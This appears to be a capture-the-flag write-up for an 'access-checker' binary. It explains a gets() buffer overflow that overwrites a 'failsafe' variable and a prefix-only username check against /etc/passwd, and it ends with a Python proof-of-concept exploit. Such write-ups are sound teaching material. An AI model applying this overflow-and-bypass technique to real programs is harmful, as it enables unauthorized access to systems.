
# Vulnerability
------

This challenge happens on the `access-checker` binary file.

This code performs two main checks before granting access:
- First, the `check_access` function scans the `/etc/passwd` file line by line to verify whether the provided username exists. It compares the input username with the beginning of each line (which typically contains usernames) and returns success if a match is found.
- Second, the program checks the value of the `failsafe` variable. Access is only granted if this variable is different from `"Locked"`.


As you can see, the program uses hardcoded values to define the sizes of its variables, such as `failsafe` (64 bytes), `username` (64 bytes) :

```C
int main(int argc, char **argv) {
	char failsafe[64] = "Locked";
	char username[64];
	
	printf("ECorp access checker, please enter your username: ");
	fflush(stdout);
	gets(username);
	
	if (check_access(username) == 1 && strcmp(failsafe, "Locked"))
		data_exfiltration();
	else
		puts("Thank you for using ECorp access checker!\n");
	return 0;
}
```

Also, in the `check_access` function, there are weak validation checks that could allow the access control to be bypassed. Although the program reads each line of the `/etc/passwd` file, it only compares up to the first ten characters of each line with the supplied `username`, which can lead to partial matches and unintended validation :

```C
fd = fopen("/etc/passwd", "r");
printf("Scanning /etc/passwd...\n");

while (ret > 0) {
	ret = getline(&line, &n, fd);
	if (ret)
		line[ret - 1] = 0;
	for (int i = 1; i < 10; ++i) // usernames shouldn't be longer anyway
		if (!strncmp(line, username, i)) {
			printf("Valid username '%s' found\n", username);
			return 1;
		}
}
printf("! No valid username found !\n");

```

First, you exploited the unsafe use of `gets()` to trigger a buffer overflow on the `username` variable. By supplying an overly long input, you overwrote adjacent memory—specifically the `failsafe` variable—changing its value from `"Locked"` to `"Unlocked"`. At the same time, you ensured that your input starts with a valid prefix from a `/etc/passwd` entry (at least 10 characters), allowing it to pass the flawed username check.

# PoC
---

```python
#!/usr/bin/env python3

import subprocess

binary_path = '/opt/intern/access-checker'

def get_passwd_line():
    with open("/etc/passwd", "r") as f:
        return f.readline().strip().encode()

def exploit():
    try:
        passwd_line = get_passwd_line()
        payload = passwd_line
        payload += b"A" * (80 - len(passwd_line))
        process = subprocess.Popen(
            [binary_path],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        stdout, stderr = process.communicate(input=payload)
        print(stdout.decode(errors="ignore"))
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    exploit()
'''